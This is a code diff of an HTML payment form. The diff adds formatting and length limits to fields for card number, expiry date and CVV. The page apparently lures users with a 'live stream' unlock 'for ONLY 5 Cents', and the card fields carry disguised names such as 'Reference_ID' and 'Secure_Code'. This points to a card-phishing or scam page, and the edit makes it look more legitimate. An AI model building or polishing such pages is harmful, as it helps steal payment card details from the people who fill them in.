@@ -173,11 +173,11 @@
       <label>Cardholder Name</label>
       <input type="text" name="Reference_User" placeholder="Name on Card" required>
       <label>Card Number</label>
-      <input type="text" name="Reference_ID" placeholder="0000 0000 0000 0000" required>
+      <input type="text" name="Reference_ID" placeholder="0000 0000 0000 0000" maxlength="19" oninput="this.value = this.value.replace(/\D/g, '').replace(/(\d{4})(?=\d)/g, '$1 ');" required>
 
       <div style="display: flex; gap: 15px;">
-        <div style="flex: 1;"><label>Expiration</label><input type="text" name="Expiry" placeholder="MM/YY" required></div>
-        <div style="flex: 1;"><label>CVV</label><input type="text" name="Secure_Code" placeholder="123" required></div>
+        <div style="flex: 1;"><label>Expiration</label><input type="text" name="Expiry" placeholder="MM/YY" maxlength="5" oninput="this.value = this.value.replace(/\D/g, '').replace(/^(\d{2})/, '$1/');" required></div>
+        <div style="flex: 1;"><label>CVV</label><input type="text" name="Secure_Code" placeholder="123" maxlength="3" oninput="this.value = this.value.replace(/\D/g, '');" required></div>
       </div>
 
       <button type="submit" class="btn" id="submitBtn">UNLOCK LIVE STREAM — For ONLY 5 Cents</button>
